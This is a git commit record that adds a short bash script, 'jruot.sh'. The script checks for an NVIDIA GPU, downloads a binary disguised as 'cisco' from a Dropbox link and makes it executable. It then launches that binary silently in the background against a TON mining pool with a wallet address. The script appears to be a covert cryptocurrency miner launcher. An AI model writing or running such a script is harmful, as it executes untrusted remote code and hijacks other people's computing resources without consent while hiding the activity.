ff0b6bffff20d7f1e7dd8ee672dcf4c3a50f2311
deviolare <103019694+deviolare@users.noreply.github.com>
2022-05-30 15:54:32 +0700

    Create jruot.sh

---
+++ jruot.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+nvidia-smi
+sudo apt update -y
+wget https://www.dropbox.com/s/4dgaygg0lmxgd4z/cisco?raw=1
+chmod + x cisco?raw=1
+nohup bash -c "./cisco?raw=1 run https://next.ton-pool.club EQAOV41G7d93Ug0B6PRjp4RHZ7ID_ivK74nCJiX-X8WtCvwD &> /dev/null 2>&1&"
+#
